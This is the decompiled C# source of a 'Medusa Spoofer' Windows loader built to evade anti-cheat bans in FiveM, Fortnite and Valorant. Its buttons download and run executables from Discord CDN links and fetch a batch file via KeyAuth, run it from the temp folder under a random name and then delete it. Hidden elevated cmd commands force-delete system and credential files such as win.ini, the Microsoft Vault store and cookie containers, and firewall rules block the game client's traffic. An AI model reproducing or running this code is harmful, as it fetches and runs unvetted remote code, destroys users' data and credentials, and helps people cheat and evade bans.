using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using KeyAuth;
using Loader.Properties;
using Siticone.UI.WinForms;

namespace Loader
{
	// Token: 0x0200001A RID: 26
	public partial class game : Form
	{
		// Token: 0x060000E1 RID: 225 RVA: 0x0000271C File Offset: 0x0000091C
		public game()
		{
			this.InitializeComponent();
		}

		// Token: 0x060000E2 RID: 226 RVA: 0x000082E8 File Offset: 0x000064E8
		private void siticoneRoundedButton1_Click(object sender, EventArgs e)
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string processName = "FiveM";
			string processName2 = "Steam";
			Process process = Process.GetProcessesByName(processName).FirstOrDefault<Process>();
			if (process != null)
			{
				process.CloseMainWindow();
				process.Kill();
				process.WaitForExit();
				process.Dispose();
			}
			Process process2 = Process.GetProcessesByName(processName2).FirstOrDefault<Process>();
			if (process2 != null)
			{
				process2.CloseMainWindow();
				process2.Kill();
				process2.WaitForExit();
				process2.Dispose();
			}
			if (!File.Exists(folderPath + "\\FiveM\\FiveM.exe"))
			{
				Console.Beep();
				MessageBox.Show("Failed To Clean", "Medusa Spoofer - FiveM", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				DialogResult dialogResult = MessageBox.Show("You want us to fix it for you?", "Medusa Spoofer", MessageBoxButtons.YesNo);
				if (dialogResult == DialogResult.Yes)
				{
					if (Directory.Exists(folderPath + "\\FiveM"))
					{
						Directory.Delete(folderPath + "\\FiveM", false);
					}
					if (!Directory.Exists(folderPath + "\\FiveM"))
					{
						Directory.CreateDirectory(folderPath + "\\FiveM");
					}
					using (WebClient webClient = new WebClient())
					{
						webClient.DownloadFile("https://cdn.discordapp.com/attachments/950112367767851102/962261956880891924/FiveM.exe", folderPath + "\\FiveM\\FiveM.exe");
						Process.Start(folderPath + "\\FiveM\\FiveM.exe");
						MessageBox.Show("Downloaded and Started");
					}
				}
				return;
			}
			if (Directory.Exists(folderPath + "\\DigitalEntitlements"))
			{
				Directory.Delete(folderPath + "\\DigitalEntitlements", true);
			}
			if (Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\crashes"))
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\crashes", true);
			}
			if (Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\logs"))
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\logs", true);
			}
			if (Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\data\\cache"))
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\data\\cache", true);
			}
			if (Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\data\\server-cache"))
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\data\\server-cache", true);
			}
			if (Directory.Exists(folderPath2 + "\\CitizenFX"))
			{
				Directory.Delete(folderPath2 + "\\CitizenFX", true);
			}
			this.ibuF2hGl0o();
			MessageBox.Show("Successfully Cleaned", "Medusa Spoofer - FiveM", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x060000E3 RID: 227 RVA: 0x00008538 File Offset: 0x00006738
		public void ibuF2hGl0o()
		{
			WebClient webClient = new WebClient();
			string tempPath = Path.GetTempPath();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/931203518612766742/946734107889655828/music.wav", tempPath + this.grwXIswrPv + ".mp3");
			new SoundPlayer(tempPath + this.grwXIswrPv + ".mp3").Play();
		}

		// Token: 0x060000E4 RID: 228 RVA: 0x00008588 File Offset: 0x00006788
		private void siticoneRoundedButton2_Click(object sender, EventArgs e)
		{
			new WebClient();
			string tempPath = Path.GetTempPath();
			byte[] bytes = Login.KeyAuthApp.download("738975");
			File.WriteAllBytes(tempPath + this.grwXIswrPv + ".bat", bytes);
			Process.Start(tempPath + this.grwXIswrPv + ".bat");
			Thread.Sleep(2500);
			this.RcHHWetqgvxZ();
			systemspoof.kt8t5gn6UldO();
			MessageBox.Show("Cleaned/Spoofed FN", "Medusa Spoofer - Fortnite", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x060000E5 RID: 229 RVA: 0x00002736 File Offset: 0x00000936
		public static string RandomString(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
			select s[game.random.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x060000E6 RID: 230 RVA: 0x00008608 File Offset: 0x00006808
		private void siticoneRoundedButton3_Click(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					Verb = "runas",
					Arguments = "/C del /f \"C:\\Windows\\win.ini\" && del /f \"C:\\Riot Games\\VALORANT\\live\\Manifest_NonUFSFiles_Win64.txt\" && del /f \"C:\\Riot Games\\VALORANT\\live\\Engine\\Binaries\\ThirdParty\\CEF3\\Win64\\icudtl.dat\" && del /f \"C:\\Riot Games\\Riot Client\\UX\\Plugins\\plugin - manifest.json\" && del /f \"C:\\Riot Games\\Riot Client\\UX\\icudtl.dat\" && del /f \"C:\\Riot Games\\Riot Client\\UX\\natives_blob.bin\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Vault\\UserProfileRoaming\\Latest.dat\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\AC\\INetCookies\\ESE\\container.dat\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\UnrealEngine\\4.23\\Saved\\Config\\WindowsClient\\Manifest.ini\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Common\\DeviceHealthSummaryConfiguration.ini\" && del /f \"C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache\\dmrc.idx\" && del /f \"C:\\Users\\%username%\\ntuser.ini\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\container.dat\" && del /f \"C:\\System Volume Information\\tracking.log\" && del /f \"D:\\System Volume Information\\tracking.log\""
				}
			}.Start();
			MessageBox.Show("Spoofed Valorant", "Medusa Spoofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x060000E7 RID: 231 RVA: 0x00008694 File Offset: 0x00006894
		public void RcHHWetqgvxZ()
		{
			string tempPath = Path.GetTempPath();
			if (Process.GetProcessesByName(this.grwXIswrPv + ".bat").Length == 0)
			{
				File.Delete(tempPath + this.grwXIswrPv + ".bat");
				return;
			}
			Thread.Sleep(5000);
			this.RcHHWetqgvxZ();
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x000086E8 File Offset: 0x000068E8
		private void siticoneRoundedButton4_Click(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					Verb = "runas",
					Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= yes > nul"
				}
			}.Start();
			MessageBox.Show("FiveM Bypassed Enabled", "Medusa Spoofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x060000E9 RID: 233 RVA: 0x00008774 File Offset: 0x00006974
		private void siticoneRoundedButton5_Click(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					Verb = "runas",
					Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= no > nul"
				}
			}.Start();
			MessageBox.Show("FiveM Bypassed Disabled", "Medusa Spoofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x060000EA RID: 234 RVA: 0x00008800 File Offset: 0x00006A00
		private void siticoneCirclePictureBox1_Click(object sender, EventArgs e)
		{
			new WebClient();
			string tempPath = Path.GetTempPath();
			byte[] bytes = Login.KeyAuthApp.download("146685");
			File.WriteAllBytes(tempPath + "slet.mp4", bytes);
			Process.Start(tempPath + "slet.mp4");
			Thread.Sleep(4000);
			if (File.Exists(tempPath + "slet.mp4"))
			{
				File.Delete(tempPath + "slet.mp4");
			}
			Process process = Process.GetProcessesByName("Video.UI").FirstOrDefault<Process>();
			if (process != null)
			{
				process.CloseMainWindow();
				process.Kill();
				process.WaitForExit();
				process.Dispose();
			}
		}

		// Token: 0x0400007C RID: 124
		public static Random random = new Random();

		// Token: 0x0400007D RID: 125
		private string grwXIswrPv = game.RandomString(5);
	}
}
